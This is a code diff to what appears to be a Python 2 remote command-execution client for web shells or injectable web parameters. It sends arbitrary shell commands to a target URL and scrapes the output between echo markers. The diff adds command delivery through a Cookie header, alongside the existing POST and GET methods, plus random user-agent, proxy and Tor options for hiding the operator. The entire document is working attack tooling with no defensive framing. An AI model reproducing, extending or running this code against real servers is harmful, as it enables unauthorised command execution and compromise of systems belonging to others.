@@ -1,7 +1,7 @@
 from httplib import InvalidURL
 from random import randint
 from urllib import urlencode, quote
-from urllib2 import ProxyHandler, build_opener, install_opener, HTTPError
+from urllib2 import ProxyHandler, build_opener, install_opener, HTTPError, HTTPHandler
 
 from core.libs.listen_handler import listen
 from core.libs.connect_handler import connect
@@ -46,7 +46,7 @@ class MakeRequest(object):
         self.parameter = getargs.parameter
         self.proxy = getargs.proxy
         self.user_agent = getargs.agent
-        self.random_agent = getargs.random_agent
+        self.random_agent = USER_AGENTS[randint(0, len(USER_AGENTS) - 1)]
         self.tor = getargs.tor
 
     def get_page_source(self, cmd):
@@ -60,7 +60,7 @@ class MakeRequest(object):
         elif getargs.url:
             # Proxy support
             proxy_support = ProxyHandler({'http': self.proxy} if self.proxy else {})
-            opener = build_opener(proxy_support)
+            opener = build_opener(proxy_support, HTTPHandler(debuglevel=0))
 
             # Tor support
             if self.tor:
@@ -69,8 +69,8 @@ class MakeRequest(object):
                 #exit()
 
             # User angent
-            if self.random_agent:
-                opener.addheaders = [('User-agent', USER_AGENTS[randint(0, len(USER_AGENTS) - 1)])]
+            if getargs.random_agent:
+                opener.addheaders = [('User-agent', self.random_agent)]
             elif self.user_agent:
                 opener.addheaders = [('User-agent', self.user_agent)]
             else:
@@ -80,7 +80,7 @@ class MakeRequest(object):
             errmsg = colored('\n[!] Check your network connection and/or the proxy (if you\'re using one)', 'red')
 
             # Check if the method is POST
-            if self.method == 'post' or self.parameter:
+            if self.method == 'post' or (self.parameter and self.method != 'cookie'):
                 self.method = 'post'
                 parameters = urlencode({self.parameter: 'echo ::command_start::;' + self.cmd.strip(';') + ';echo ::command_end::;'})
                 try:
@@ -98,10 +98,30 @@ class MakeRequest(object):
 #                except:
 #                    exit(fourzerofourmsg)
 
+            elif self.method == 'cookie':
+                opener.addheaders += [
+                        ('Cookie', '{0}={1}'.format(self.parameter, quote('echo ::command_start::;' + self.cmd.rstrip().strip(';') + ';echo ::command_end::;'))),
+                        ]
+                sc = map(str.rstrip, opener.open(self.url).readlines())
+                sc = '::command_deli::'.join(sc)
+                sc = re.search('::command_start::(.+)::command_end::', sc)
+                if sc:
+                    sc = sc.group(1).split('::command_deli::')[1:-1]
+                else:
+                    sc = map(str.rstrip, opener.open('{0}{1}'.format(self.url, quote(self.cmd.strip(';')))).readlines())
+
+                return sc
+
             # If the used method set GET
             else:
                 try:
-                    sc = map(str.rstrip, opener.open('{0}{1}'.format(self.url, quote('echo ::command_start::;' + self.cmd.strip(';') + ';echo ::command_end::;'))).readlines())
+                    if self.method == 'cookie':
+                        opener.addheaders += [
+                                ('Cookie', '{0}={1}'.format(self.parameter, quote('echo ::command_start::;' + self.cmd.rstrip().strip(';') + ';echo ::command_end::;'))),
+                                ]
+                        sc = map(str.rstrip, opener.open(self.url).readlines())
+                    else:
+                        sc = map(str.rstrip, opener.open('{0}{1}'.format(self.url, quote('echo ::command_start::;' + self.cmd.strip(';') + ';echo ::command_end::;'))).readlines())
                     sc = '::command_deli::'.join(sc)
                     sc = re.search('::command_start::(.+)::command_end::', sc)
                     if sc:
